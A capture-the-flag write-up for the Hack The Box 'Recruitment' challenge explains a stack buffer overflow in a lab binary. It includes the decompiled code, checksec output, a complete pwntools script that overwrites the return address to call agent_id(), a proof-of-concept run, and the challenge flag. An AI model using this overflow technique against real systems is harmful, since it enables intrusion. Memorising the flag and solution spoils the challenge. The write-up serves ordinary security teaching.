# Recruitment 

## Description: 

* We are looking for some skilled agents to train in order to make the greatest spy army in the world. We need your info in order to join us and give you an agent id. 

## Objective: 

* Take advantage of *Bof* to overwrite the return address and call `agent_id()`.

## Flag: :black_flag:
* HTB{th1s_1s_ju5t_th3_st4rt_4g3nt}

### Difficulty:
* Very Easy

## Challenge:

The interface looks like this:

```console
$ ./recruitment 
Agent, this is the first and last time we will hear your real name!
From now on, you are Agent [40].
Please, introduce yourself.
> w3t
Excellent Agent [40]!
You are free for now, you will be informed for your next mission soon.
$ ./recruitment 
Agent, this is the first and last time we will hear your real name!
From now on, you are Agent [7].
Please, introduce yourself.
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Excellent Agent [1094795585]!
You are free for now, you will be informed for your next mission soon.
Segmentation fault (core dumped)
```

As we can see, there is a `SegFault` after some "A"s. That means there is a possible *BufferOverflow*.

We run a `checksec` to verify this:
```console
$ checksec ./recruitment
[*] '/home/w3th4nds/github/HTB-Challenges/pwn/CTF_101/challenge/recruitment'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
**Canary** is disabled, so *Bof* will be even easier now.

Let's open a disassembler to analyze the program.

### Disassembly :pick:

We start from `main()`:

```c
undefined8 main(void)

{
  int iVar1;
  time_t tVar2;
  undefined local_38 [44];
  uint local_c;
  
  setup();
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  iVar1 = rand();
  local_c = iVar1 % 100 + 1;
  printf(
         "Agent, this is the first and last time we will hear your real name!\nFrom now on, you areAgent [%d].\nPlease, introduce yourself.\n> "
         ,(ulong)local_c);
  read(0,local_38,0x40);
  printf(
         "Excellent Agent [%d]!\nYou are free for now, you will be informed for your next missionsoon.\n"
         ,(ulong)local_c);
  return 0;
}
```

We see that there is another interesting function that is never called:

```c
void agent_id(void)

{
  char local_38 [40];
  FILE *local_10;
  
  local_10 = fopen("./flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Error loading flag! Please contact the admin.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_38,0x22,local_10);
  fclose(local_10);
  puts(local_38);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

This function reads the flag and prints it for us.

What we need to do:

* Overflow the buffer and overwrite the return address with the address of `agent_id`.

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = 'docker.hackthebox.eu' # change this
port = 30029 # change this
fname = './recruitment' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

e = ELF(fname)

ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)
sa = lambda x,y : r.sendafter(x,y)

def get_flag():
	ru('{')[:-1]
	flag = ru('}')
	print('Flag: HTB{' + flag.decode())

def pwn():
	junk = b'A'*56
	payload = junk + p64(e.symbols['agent_id'])
	sa('>', payload)
	get_flag()

if __name__ == '__main__':
	pwn()

```

### PoC: :checkered_flag:

```console
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
[*] 'challenge/recruitment'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Flag: HTB{th1s_1s_ju5t_th3_st4rt_4g3nt}
```
